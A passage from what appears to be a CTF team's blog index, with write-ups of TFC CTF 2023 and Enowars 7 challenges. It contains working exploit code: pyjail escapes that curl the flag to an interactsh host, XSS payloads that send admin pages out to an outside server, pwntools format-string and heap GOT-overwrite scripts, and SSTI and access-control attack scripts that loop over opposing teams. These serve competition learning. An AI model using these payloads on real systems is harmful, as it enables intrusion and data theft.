transformation:exec(&#39;print(open(&quot;flag&quot;).read())&#39;)After:𝘦𝘹𝘦𝘤(&#39;\\160\\162\\151\\156\\164\\050\\157\\160\\145\\156\\050\\042\\146\\154\\141\\147\\042\\051\\056\\162\\145\\141\\144\\050\\051\\051&#39;)Putting this in gives us the flag:TFCCTF{18641f40c9beac02ceeaf87db851c386}My Third CalculatorThis is the next pyjail challenge (there was no second calculator).import sysprint(&quot;This is a safe calculator&quot;)inp = input(&quot;Formula: &quot;)sys.stdin.close()blacklist = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.&quot;if any(x in inp for x in blacklist): print(&quot;Nice try&quot;) exit()fns = { &quot;__builtins__&quot;: {&quot;setattr&quot;: setattr, &quot;__import__&quot;: __import__, &quot;chr&quot;: chr}}print(eval(inp, fns, fns))This time builtins are overwritten except for setattr, __import__ and chr.We can change strings into a bunch of chr() calls using this smol script:def text_to_character_code(text): return &quot;+&quot;.join([f&quot;char({ord(x)})&quot; for x in text])print(text_to_character_code(input(&#39;input&amp;gt;&#39;)))After looking through old pyjail solutions we ended up using the antigravity payload:__import__(&#39;antigravity&#39;,setattr(__import__(&#39;os&#39;),&#39;environ&#39;,{&#39;BROWSER&#39;:&#39;/bin/sh -c &quot;curl -T flag cj2hjb3b7pnbr8g80gf0ifgcciwaz587a.oast.fun;exit&quot; #%s&#39;})) The antigravity module is a joke module that is a reference to XKCD #353 and importing it opens that XKCD comic in the browser. We can overwrite the browser env variable with our shell command and that gets executed instead of the browser when it gets imported.We transform this payload by changing all the strings into chr() calls and italicising like before:__𝘪𝘮𝘱𝘰𝘳𝘵__(𝘤𝘩𝘳(97)+𝘤𝘩𝘳(110)+𝘤𝘩𝘳(116)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(103)+𝘤𝘩𝘳(114)+𝘤𝘩𝘳(97)+𝘤𝘩𝘳(118)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(116)+𝘤𝘩𝘳(121),𝘴𝘦𝘵𝘢𝘵𝘵𝘳(__𝘪𝘮𝘱𝘰𝘳𝘵__(𝘤𝘩𝘳(111)+𝘤𝘩𝘳(115)),𝘤𝘩𝘳(101)+𝘤𝘩𝘳(110)+𝘤𝘩𝘳(118)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(114)+𝘤𝘩𝘳(111)+𝘤𝘩𝘳(110),{𝘤𝘩𝘳(66)+𝘤𝘩𝘳(82)+𝘤𝘩𝘳(79)+𝘤𝘩𝘳(87)+𝘤𝘩𝘳(83)+𝘤𝘩𝘳(69)+𝘤𝘩𝘳(82):𝘤𝘩𝘳(47)+𝘤𝘩𝘳(98)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(110)+𝘤𝘩𝘳(47)+𝘤𝘩𝘳(115)+𝘤𝘩𝘳(104)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(45)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(34)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(117)+𝘤𝘩𝘳(114)+𝘤𝘩𝘳(108)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(45)+𝘤𝘩𝘳(84)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(102)+𝘤𝘩𝘳(108)+𝘤𝘩𝘳(97)+𝘤𝘩𝘳(103)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(106)+𝘤𝘩𝘳(50)+𝘤𝘩𝘳(104)+𝘤𝘩𝘳(106)+𝘤𝘩𝘳(98)+𝘤𝘩𝘳(51)+𝘤𝘩𝘳(98)+𝘤𝘩𝘳(55)+𝘤𝘩𝘳(112)+𝘤𝘩𝘳(110)+𝘤𝘩𝘳(98)+𝘤𝘩𝘳(114)+𝘤𝘩𝘳(56)+𝘤𝘩𝘳(103)+𝘤𝘩𝘳(56)+𝘤𝘩𝘳(48)+𝘤𝘩𝘳(103)+𝘤𝘩𝘳(102)+𝘤𝘩𝘳(48)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(102)+𝘤𝘩𝘳(103)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(119)+𝘤𝘩𝘳(97)+𝘤𝘩𝘳(122)+𝘤𝘩𝘳(53)+𝘤𝘩𝘳(56)+𝘤𝘩𝘳(55)+𝘤𝘩𝘳(97)+𝘤𝘩𝘳(46)+𝘤𝘩𝘳(111)+𝘤𝘩𝘳(111)+𝘤𝘩𝘳(98)+𝘤𝘩𝘳(112)+𝘤𝘩𝘳(111)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(46)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(111)+𝘤𝘩𝘳(109)+𝘤𝘩𝘳(59)+𝘤𝘩𝘳(101)+𝘤𝘩𝘳(120)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(116)+𝘤𝘩𝘳(34)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(35)+𝘤𝘩𝘳(37)+𝘤𝘩𝘳(115)}))Submitting this gave us the flag:TFCCTF{60c7502daf7f94106a295d7dea14b63df2048f8d}WebBaby Ducky NotesWe’re given the source code for this notes app. First we checked for where the flag is located. query(con, f&#39;&#39;&#39; INSERT INTO posts ( user_id, title, content, hidden ) VALUES ( 1, &#39;Here is a ducky flag!&#39;, &#39;{os.environ.get(&quot;FLAG&quot;)}&#39;, 0 ); &#39;&#39;&#39;)The flag is in the db as a post by the admin but the hidden column is set to 0 so it is publically viewable.Checking the routes we find where we can view it:@web.route(&#39;/posts/view/&amp;lt;user&amp;gt;&#39;, methods=[&#39;GET&#39;])@auth_requireddef posts_view(username, user): try: posts = db_get_user_posts(user, username == user) except: raise Exception(username) return render_template(&#39;posts.html&#39;, posts=posts)We see the flag by visiting http://challs.tfcctf.com:30395/posts/view/adminFlag:TFCCTF{Adm1n_l0St_h1s_m1nd!} Baby Ducky Notes: RevengeThe challenge has patched the previous issue but there is more to find.This time the flag is a hidden post so we can’t see it just by visiting the URL because hidden posts can only be seen by the user who uploaded them.We need to XSS the admin and get them to visit that page and send us the content.In the flask template for the posts page we see the following:&amp;lt;p&amp;gt; {{post.get(&#39;content&#39;) | safe}} &amp;lt;/p&amp;gt;The usage of “safe” here means that flask will not sanitize the post content which allows us to XSSSo we make a new post with this as the post content:&amp;lt;script&amp;gt;var http=new XMLHttpRequest();http.open(&#39;GET&#39;,&#39;http://challs.tfcctf.com:31743/posts/view/admin&#39;, true);http.onreadystatechange=function(){ var out = new XMLHttpRequest(); out.open(&#39;POST&#39;,&#39;https://cj1r2h01ft1j3g1e3q6gkn5t3bkzmpudp.oast.live&#39;) out.setRequestHeader(&#39;Content-type&#39;, &#39;application/x-www-form-urlencoded&#39;); out.send(&#39;data=&#39;+btoa(http.responseText));}http.send();&amp;lt;/script&amp;gt;We get this response on our interactsh output:POST / HTTP/2.0Host: cj1r2h01ft1j3g1e3q6gkn5t3bkzmpudp.oast.liveAccept: */*Accept-Encoding: gzip, deflate, brContent-Length: 5Content-Type: application/x-www-form-urlencodedOrigin: http://localhost:1337Referer: http://localhost:1337/Sec-Ch-Ua: &quot;Not/A)Brand&quot;;v=&quot;99&quot;, &quot;HeadlessChrome&quot;;v=&quot;115&quot;, &quot;Chromium&quot;;v=&quot;115&quot;Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: &quot;Linux&quot;Sec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: cross-siteUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/115.0.5790.110 Safari/537.36data=No data? Strange. The referer and origin reveal that the URL for the bot is not the same as the one we see so we must change our payload to account for that as the cookies are tied to that URL.Final payload:&amp;lt;script&amp;gt;var http=new XMLHttpRequest();http.open(&#39;GET&#39;,&#39;http://localhost:1337/posts/view/admin&#39;, true);http.onreadystatechange=function(){ var out = new XMLHttpRequest(); out.open(&#39;POST&#39;,&#39;https://cj1r2h01ft1j3g1e3q6gkn5t3bkzmpudp.oast.live&#39;) out.setRequestHeader(&#39;Content-type&#39;, &#39;application/x-www-form-urlencoded&#39;); out.send(&#39;data=&#39;+btoa(http.responseText));}http.send();&amp;lt;/script&amp;gt;We get back:data=PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCI+CiAgICA8dGl0bGU+QmFieSBEdWNreSBOb3RlczogUmV2ZW5nZSE8L3RpdGxlPgogICAgPHNjcmlwdCBzcmM9Ii9zdGF0aWMvanMvanF1ZXJ5LmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSIvc3RhdGljL2pzL3JlcG9ydC5qcyI+PC9zY3JpcHQ+CiAgICA8bGluayByZWw9InByZWNvbm5lY3QiIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20iPgogICAgPGxpbmsgcmVsPSJwcmVjb25uZWN0IiBocmVmPSJodHRwczovL2ZvbnRzLmdzdGF0aWMuY29tIiBjcm9zc29yaWdpbj4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iL3N0YXRpYy9jc3Mvc3R5bGVzLmNzcyIgLz4KPC9oZWFkPgoKPGJvZHk+CiAgICAKICAgIDxuYXYgY2xhc3M9Im5hdmJhciI+CiAgICAgICAgPGRpdiBpZD0idHJhcGV6b2lkIj4KICAgICAgICAgICAgPGEgaHJlZj0iL2xvZ2luIiBjbGFzcz0iZXhwYW5kSG9tZSI+TG9naW48L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ii9yZWdpc3RlciIgY2xhc3M9ImV4cGFuZEhvbWUiPlJlZ2lzdGVyPC9hPgogICAgICAgICAgICA8YSBocmVmPSIvcG9zdHMvdmlldy9hZG1pbiIgY2xhc3M9ImV4cGFuZEhvbWUiPlZpZXc8L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ii9wb3N0cy9jcmVhdGUiIGNsYXNzPSJleHBhbmRIb21lIj5DcmVhdGU8L2E+CiAgICAgICAgPC9kaXY+CiAgICA8L25hdj4KCiAgICA8ZGl2IGNsYXNzPSJwb3N0c19saXN0Ij4KICAgIDx1bCBjbGFzcz0icG9zdHNfdWwiPgogICAgICAgIAogICAgICAgIDxsaT4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iYmxvZ19wb3N0Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lcl9jb3B5Ij4KICAgICAgICAgICAgICAgICAgPGgxPiBIZXJlIGlzIGEgZHVja3kgZmxhZyEgPC9oMT4KICAgICAgICAgICAgICAgICAgPGgzPiBhZG1pbiA8L2gzPgogICAgICAgICAgICAgICAgICA8cD4gVEZDQ1RGe0V2M3J5X2R1Q2tfa24wdzVfeFNzIX0gPC9wPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvbGk+CiAgICAgICAgIAogICAgPC91bD4KICAgIDwvZGl2PgoKICAgIDxkaXYgY2xhc3M9InJlcG9ydCI+CiAgICAgICAgPGRpdiBjbGFzcz0ibWVzc2FnZSIgaWQ9ImFsZXJ0LW1zZyIgaGlkZGVuID48L2Rpdj4KICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgaWQ9InJlcG9ydC1idG4iPlJlcG9ydCB0byBhZG1pbjwvYnV0dG9uPgogICAgPC9kaXY+CiAgICAKICAgIDxmb290ZXI+CiAgICAgICAgPGRpdiBjbGFzcz0iZm9vdGVyLWNvbnRlbnQiPgogICAgICAgICAgICA8aDM+RGlzY2xhaW1lcjwvaDM+CiAgICAgICAgICAgIDxwPlRoaXMgY2hhbGxlbmdlIGlzIG1hZGUgdG8gYmUgaGFja2VkLiBBbnkgaW5kaWNhdGlvbiBvZiBwcm9wZXIgdXNhZ2Ugb3IgdW50YXBwZWQgYWN0aXZpdHkgd2lsbCByZXN1bHQgaW4gbGVnYWwgc2FuY3Rpb25zLiBIYXBweSBoYWNraW5nITwvcD4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJmb290ZXItYm90dG9tIj4KICAgICAgICAgICAgPHA+Y29weXJpZ2h0ICZjb3B5OyA8YSBocmVmPSIjIj5TYWdpIC8gVGhlIEZldyBDaG9zZW4gQ1RGIDIwMjMgPC9hPiAgPC9wPgogICAgICAgICAgICA8ZGl2IGlkPSJwb3QiPgogICAgICAgICAgICAgICAgPGltZyBzcmM9Ii9zdGF0aWMvaW1hZ2VzL2R1Y2suZ2lmIiB3aWR0aD0xMDBweCBoZWlnaHQ9MTAwcHg+CiAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CgogICAgPC9mb290ZXI+CiAgICAKPC9ib2R5PgoKPC9odG1sPg==Base64 decoding that and we get the flag: &amp;lt;div class=&quot;blog_post&quot;&amp;gt; &amp;lt;div class=&quot;container_copy&quot;&amp;gt; &amp;lt;h1&amp;gt; Here is a ducky flag! &amp;lt;/h1&amp;gt; &amp;lt;h3&amp;gt; admin &amp;lt;/h3&amp;gt; &amp;lt;p&amp;gt; TFCCTF{Ev3ry_duCk_kn0w5_xSs!} &amp;lt;/p&amp;gt; &amp;lt;/div&amp;gt;Cookie StoreThis is another XSS challenge. This time the bot types the flag into a form as we can see in the source code we’re given: client.get(f&quot;http://localhost:1337/form_builder?fields={fields}&quot;) time.sleep(2) client.find_element(By.ID, &quot;title&quot;).send_keys(FLAG) client.execute_script(&quot;&quot;&quot;document.querySelector(&#39;input[type=&quot;submit&quot;]&#39;).click();&quot;&quot;&quot;) time.sleep(2)Initially it seemed like this was going to be an XSS challenge. We can see we can get HTML injection as the javascript dynamically modifies the page in templates/form_builder.html: let form_html = &#39;&#39;; let fields_list = []; if (fields) { fields_list = fields.split(&#39;,&#39;); fields_list.forEach(element =&amp;gt; { form_html += `&amp;lt;div class=&quot;mb-4&quot;&amp;gt; &amp;lt;label for=&quot;${element}&quot; class=&quot;block text-gray-700 font-bold mb-2&quot;&amp;gt;${element}&amp;lt;/label&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;${element}&quot; id=&quot;${element}&quot; class=&quot;shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline&quot;&amp;gt; &amp;lt;/div&amp;gt;`; }); } // This will sanitize the input document.querySelector(&#39;#form_builder&#39;).setHTML(form_html);This setHTML function didn’t work in my browser but it’s supposed to sanitize HTML to disallow most forms of XSS so script tags dont work and event attributes like onclick etc also don’t work.We were able to get the flag with this payload:&amp;lt;input type=&quot;submit&quot; formaction=&quot;http://cj2o7ibb7pn8qd9o99dg8w48u735kpf5k.oast.fun/lol&quot; /&amp;gt;The bot will click this button as its earlier on the page than the other. According to the docs from Mozilla the formaction attribute takes precedence over the action attribute on the form element so the inputs in the form will go to our page instead of the intended one.In the interactsh window we got the flag:TFCCTF{144ab0e4c358b00b1258f2aea2250b21}Another approach we looked into was CSS injection where we extract the flag character by character but that didn’t work.Another technique that did work was redirecting to a page we control and then getting the contents of that form.Payload: &amp;lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=http://ourserver&quot;&amp;gt;On our server we have the page:&amp;lt;form method=&quot;post&quot; action=&quot;http://ourserver/log&quot;&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;title&quot; id=&quot;title&quot;&amp;gt; &amp;lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&amp;gt;&amp;lt;/form&amp;gt;By saving whats submitted to log we get the flag.McTreeThis is a very basic web app. There is a register page and a login page. When we login we get a messageGet out of here, username!From testing different things we noticed that some characters were filtered from the username like ‘{‘By registering an account with the username ‘admin{‘ the password for the admin account gets changed and we can login.The flag is then shown on the page:TFCCTF{I_l1k3_dr4g0n_tr33s__Yuh!_1ts_my_f4v0r1t3_tr33_f0r_sur3!}PwnShello WorldFor this challenge we are just given a 64 bit elf file.It’s a fairly small binary with only 3 functions. Main, Vuln and win. The win function just runs “bin/sh” so this will be our target.The vuln function has the following code: fgets((char *)&amp;amp;local_108,0x100,stdin); printf(&quot;Hello, &quot;); printf((char *)&amp;amp;local_108); putchar(10); return;So right away we can see a printf / format strings vulnerability. We can confirm this by running the program and sending %p.❯ ./shello-world%pHello, 0x7fff65541f00We don’t have any overflow and checking the securities with checksec we can see that “RELRO” is only set to Partial. This means we can overwrite parts of the GOT. Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)So our attack will be a basic format strings GOT overwrite. pwntools makes this very easy. I choose exit as my GOT entry to overwrite.Running the script the remote server we can cat the flag:TFCCTF{ab45ed10bb240fe11c5552d3db6776f708c650253755e706268b45f3aae6d925}Full script:#!/usr/bin/env python3from pwn import *exe = &#39;./shello-world&#39;elf = context.binary = ELF(exe)context.terminal = [&#39;alacritty&#39;, &#39;-e&#39;, &#39;zsh&#39;, &#39;-c&#39;]#context.log_level= &#39;DEBUG&#39;def start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # (&#39;server&#39;, &#39;port&#39;) return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)gdbscript = &#39;&#39;&#39;&#39;&#39;&#39;.format(**locals())def send_payload(payload): io.sendline(payload) return io.recvline()#### Exploit starts here ####io = start()payload = fmtstr_payload(6, { elf.got.exit : elf.sym.win }, write_size=&#39;short&#39;)io.sendline(payload)io.interactive()RandomThis challenge is a random number “guesser” style challenge. This is something I have seen a fair bit lately and even made a challenge around the idea myself in the past. So right away I knew I could use the CDLL library from python. setup(); tVar2 = time((time_t *)0x0); srand((uint)tVar2); for (local_14 = 0; local_14 &amp;lt; 10; local_14 = local_14 + 1) { iVar1 = rand(); *(int *)(v + (long)local_14 * 4) = iVar1; } puts(&quot;Guess my numbers!&quot;); for (local_10 = 0; local_10 &amp;lt; 10; local_10 = local_10 + 1) { __isoc99_scanf(&amp;amp;DAT_0010201e,input + (long)local_10 * 4); } local_c = 0; while( true ) { if (9 &amp;lt; local_c) { win(); return 0; } if (*(int *)(v + (long)local_c * 4) != *(int *)(input + (long)local_c * 4)) break; local_c = local_c + 1; } puts(&quot;You didn\\&#39;t make it :(&quot;); /* WARNING: Subroutine does not return */ exit(0);}This output from ghidra gives us enough detail to solve this.The program prints guess my numbers! and we have to try guess the correct number 10 times in a row. if we do that the program runs the win() function which just runs /bin/sh for us.From the 2nd and 3rd line you can see the seed for rand is using the current time. This time is just unix time we dont need to worry about time zones or anything like that.solve script:#!/usr/bin/env python3from pwn import *from ctypes import CDLLimport timeexe = &#39;./random&#39;elf = ELF(exe)context.binary = elfcontext.terminal = [&#39;alacritty&#39;, &#39;-e&#39;, &#39;zsh&#39;, &#39;-c&#39;]def start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # (&#39;server&#39;, &#39;port&#39;) return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)gdbscript = &#39;&#39;&#39;&#39;&#39;&#39;.format(**locals())#### Exploit starts here ####io = start()libc = CDLL(&#39;libc.so.6&#39;)current_time = libc.time(None)current_time = current_time + 0 libc.srand(current_time)io.recvuntil(b&#39;numbers!&#39;)for i in range(10): guess = libc.rand() io.sendline(str(guess).encode())io.interactive()flag:TFCCTF{W0W!_Y0U_GU3SS3D_TH3M_4LL!@!}sometimes on remote you might need to + a few seconds here: current_time = current_time + 0 NotesThis is a standard heap note style challenge. we are given the source code for this which was nice :)#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#define CONTENT_MAX (long long)256#define NOTES_MAX 10typedef struct _note_t { char* content;} note_t;void win() { system(&quot;/bin/sh&quot;);}void menu() { printf( &quot;1. Add note\\n&quot; &quot;2. Edit note\\n&quot; &quot;3. View notes\\n&quot; &quot;0. Exit\\n&quot; );}int get_index() { printf(&quot;index&amp;gt; \\n&quot;); int index; scanf(&quot;%d&quot;, &amp;amp;index); getchar(); if (index &amp;lt; 0 || index &amp;gt; NOTES_MAX) { return -1; } return index;}note_t* add() { note_t* note = malloc(sizeof(note_t)); note-&amp;gt;content = malloc(sizeof(CONTENT_MAX)); printf(&quot;content&amp;gt; \\n&quot;); fgets(note-&amp;gt;content, sizeof(CONTENT_MAX), stdin); return note;}void edit(note_t* note) { printf(&quot;content&amp;gt; \\n&quot;); fgets(note-&amp;gt;content, CONTENT_MAX, stdin);}void view(note_t* notes[]) { for (int i = 0; i &amp;lt; NOTES_MAX; i += 1) { printf(&quot;%d. &quot;, i); if (notes[i] == NULL) { printf(&quot;&amp;lt;empty&amp;gt;\\n&quot;); } else { printf(&quot;%s\\n&quot;, notes[i]-&amp;gt;content); } }}int main() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); note_t* notes[10] = { 0 }; while (1) { menu(); int input; scanf(&quot;%d&quot;, &amp;amp;input); switch (input) { case 1: { int index = get_index(); if (index == -1) { break; } notes[index] = add(); break; } case 2: { int index = get_index(); if (index == -1) { break; } if (notes[index] == NULL) { break; } edit(notes[index]); break; } case 3: view(notes); break; case 0: exit(0); break; default: break; } }}We have a win function which will be our target. This challenge has a heap overflow. the add function and the edit function both have different values for the size of the data we enter. as a result we can overflow from one chunk into the next.My idea for this exploit was GOT overwrite as it seemed the best option. If we can overwrite exit with win, the next time we call exit (sending 0 as input) win will be called and we should get a shell.As someone new to heap this challenge took a fair bit of debugging and messing around with GDB. eventually I got a working exploit.We first need to create new notes. the content of these does not matter.Than we edit the first note. and overflow into the 2nd not with our pointer to got exit once we overflow into chunk2 we can edit chunk 2 with the address of win and this will overwrite got exit with winsolve script:#!/usr/bin/env python3from pwn import *exe = &#39;./notes&#39;elf = context.binary = ELF(exe)context.terminal = [&#39;alacritty&#39;, &#39;-e&#39;, &#39;zsh&#39;, &#39;-c&#39;]#context.log_level= &#39;DEBUG&#39;def start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # (&#39;server&#39;, &#39;port&#39;) return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)gdbscript = &#39;&#39;&#39;tbreak maincontinue&#39;&#39;&#39;.format(**locals())def add_note(index, content): io.sendline(b&#39;1&#39;) io.sendline(str(index)) io.sendline(content)def edit_note(index, content): io.sendline(b&#39;2&#39;) io.sendline(str(index)) io.sendline(content)#### Exploit starts here ####io = start()win = elf.symbols.winexit_got = elf.got.exitadd_note(1,b&#39;A&#39;)add_note(2,b&#39;B&#39;)edit_note(1,b&#39;A&#39;*32+p64(exit_got))edit_note(2,p64(win))io.sendline(b&#39;0&#39;) # exitio.interactive()flag;TFCCTF{103a360f285151bfda3fb4009852c15084fd9bf997470c43c20eef413ed98898}RevPassThis is a crackme style program. While I could have actually tried to reverse the binary that goes against everything I believe in. So I looked at the main function and saw the two strings I would need.“Wrong password” and “Correct password”The address of Wrong was @ 0x00101984The address of Correct was @ 0x001019b3I used angr to solve this challenge. after about 5-10 seconds I get the flag:import angr# start at 0x400000 because cus PIE is enabledwin_adress = 0x19b3 + 0x400000fail_adress = 0x1984 + 0x400000p = angr.Project(&#39;./pass&#39;)simgr = p.factory.simulation_manager(p.factory.full_init_state())simgr.explore(find=win_adress, avoid=fail_adress)print(simgr.found[0].posix.dumps(0))flag:TFCCTF{f0und_th3_p44sv0rd}" }, { "title": "Enowars 7", "url": "/posts/Enowars7/", "categories": "Attack-Defence", "tags": "ctf, attack-defence, web, ssti", "date": "2023-07-22 00:00:00 +0000", "snippet": "Oldschool - Twig SSTIOne of the many vulnerabilities from this service was SSTI. The program is using the twig templating engine so a payload like {{7*7}} will result in 49We exploiting this in the “About me” section of the user profileAs a result of this snipped of code. we can pass SSTI payloads into service.From testing it seemed RCE was not going to work. We still had file read which is enough for us to exploit this. The following payload is used for file read:{{ source(&quot;grades/file_to_read&quot;) }}This would result in an error on the page so it was wrapped in a comment:Final payload: &amp;lt;!-- {{ source(&quot;file_we_want_to_read&quot;) }} --!&amp;gt; So we can read any file we want. but we need to read flag files! Looking at the attack.json endpoint we can see what flagstores are useful for Oldschool.A file is being upload and named randomints_md5hash this md5 hash. From looking at our own box these files are being saved in /services/grades/so we need to read grades/FLAG_IDI tested this on the NOP team with a simple payload of :&amp;lt;!-- {{ source(&quot;grades/138219_1143facd439275abb0caed4979e4f8bf&quot;) }} --!&amp;gt; and sure enough. the flag was in the source of the page. Now it was just a matter of writing an exploit script that will go to each team and grab that flag.ExploitingWe need to automate out exploit in order to exploit all the teams. To do this, we need a few “stages” to our exploit. the basic plan is: Create an account Using that account update About me with out SSTI payload Retrieve and submit the flagWe used a random string for the username and password for each account and would make a new account for each attack. The following code will make an account for us:session = requests.Session()username = rand_string(10)password = rand_string(10)session.post(f&quot;http://{ip}:9080/index.php?action=register&quot;, data={&quot;username&quot;:username,&quot;password&quot;:password})We than update our profile “about me” with out payload and grab the results of the page:payload = {&#39;about_me&#39;: &#39;&amp;lt;!--{{ source(&quot;grades/&#39;+FLAGID+&#39;&quot;) }}--&amp;gt;&#39;}session.post(f&quot;http://{ip}:9080/index.php?action=profile&quot;, data=payload)profile_page = session.get(f&quot;http://{ip}:9080/index.php?action=profile&quot;).textFLAGID and IP are taken from the attack.json endpoint.We used this bit of code to only return the flag string from out exploit script:flag_regex = re.compile(&#39;ENO[A-Za-z0-9+/=]{48}&#39;)flags = flag_regex.findall(profile_page)print(flags)Our exploit manager handles the submitting of the flag. so printing it out like that is enough for this script.Full script:#!/usr/bin/python3import requestsimport randomimport stringimport reimport osimport jsonletters = string.ascii_lowercasedef rand_string(num): return &#39;&#39;.join(random.choice(letters) for i in range(num))ip = os.getenv(&#39;TARGET_IP&#39;)extra = json.loads(os.getenv(&#39;TARGET_EXTRA&#39;))for x in extra.keys(): FLAGID = extra[x][&#39;1&#39;][0].split(&#39; &#39;)[-1] session = requests.Session() username = rand_string(10) password = rand_string(10) payload = {&#39;about_me&#39;: &#39;&amp;lt;!--{{ source(&quot;grades/&#39;+FLAGID+&#39;&quot;) }}--&amp;gt;&#39;} session.post(f&quot;http://{ip}:9080/index.php?action=register&quot;, data={&quot;username&quot;:username,&quot;password&quot;:password}) session.post(f&quot;http://{ip}:9080/index.php?action=profile&quot;, data=payload) profile_page = session.get(f&quot;http://{ip}:9080/index.php?action=profile&quot;).text flag_regex = re.compile(&#39;ENO[A-Za-z0-9+/=]{48}&#39;) flags = set(flag_regex.findall(profile_page)) for flag in flags: print(flag) asocialnetwork - Broken Access ControlThis was wonderfully made social media app. We found from tulip that the Chatroom will contain a flag. The chatroom that has a flag was the room that a user from the attack.json file was a part of. The only issue is in order to know that room this user is a part of, you must be their friend, and making friends is hard so lets force them to be our friend.When you send a friend request the following request is made:partner=THEIRNAME&amp;amp;userName=YOURNAME&amp;amp;status=sendif (req.body.status === &#39;accept&#39;) { if (!friend) { res.status(400).send(&#39;Acceptance Request not found&#39;) return } else { friend.status = &#39;accepted&#39; await friend.save() }}however, you can force them to accept your friend request by changing “send” to “accept”There is no check to ensure the user accepting the request is not the user that sent the request.So now that we are suddenly very popular. we can view our new friend profile and see what rooms they are part of. (I don’t have any screenshots of this from the live CTF). Viewing their profile gave us a room ID. this room ID was not valid to just join the chatroom. From review of the source code we needed to get the sha256 of that ID. This would let us join the chatroom and get the flag.ExploitingFor this exploit we need to: Make a new account Send a friend request to our new friend Force them to accept it. get the sha256sum of the room ID Visit the room and get the flagFirst bit is done with this:session = requests.Session()username = rand_string(10)password = rand_string(10)session.post(f&quot;http://{ip}:3000/register&quot;, data={&quot;username&quot;:username,&quot;password&quot;:password,&quot;confirmPassword&quot;:password})We can than send and accept the friend request with this:session.post(f&quot;http://{ip}:3000/friends/requests/&quot;, data={&quot;partner&quot;:FLAGID,&quot;userName&quot;:username,&quot;status&quot;:&quot;send&quot;})session.post(f&quot;http://{ip}:3000/friends/requests/&quot;, data={&quot;partner&quot;:FLAGID,&quot;userName&quot;:username,&quot;status&quot;:&quot;accept&quot;})The final part is to go to our new friends page. get the ID, hash it and view the chatroom:friend_page = session.get(f&quot;http://{ip}:3000/profile/{FLAGID}&quot;).textpattern = r&#39;&amp;lt;div class=&quot;room&quot;&amp;gt;\\s*&amp;lt;h3&amp;gt;(.*?)&amp;lt;/h3&amp;gt;&#39;test = re.search(pattern,friend_page)roomid_tmp = test.group(1).encode(&#39;utf-8&#39;)roomid = hashlib.sha256(roomid_tmp).hexdigest()chatroom = session.get(f&quot;http://{ip}:3000/chatroom/{roomid}&quot;).textFull script:#!/usr/bin/python3import requestsimport randomimport stringimport reimport osimport jsonimport hashlibletters = string.ascii_lowercasedef rand_string(num): return &#39;&#39;.join(random.choice(letters) for i in range(num))ip = os.getenv(&#39;TARGET_IP&#39;)extra = json.loads(os.getenv(&#39;TARGET_EXTRA&#39;))for x in extra.keys(): FLAGID =json.loads(extra[x][&#39;1&#39;][0])[&#39;username&#39;] #print(FLAGID) try: session = requests.Session() username = rand_string(10) password = rand_string(10) session.post(f&quot;http://{ip}:3000/register&quot;, 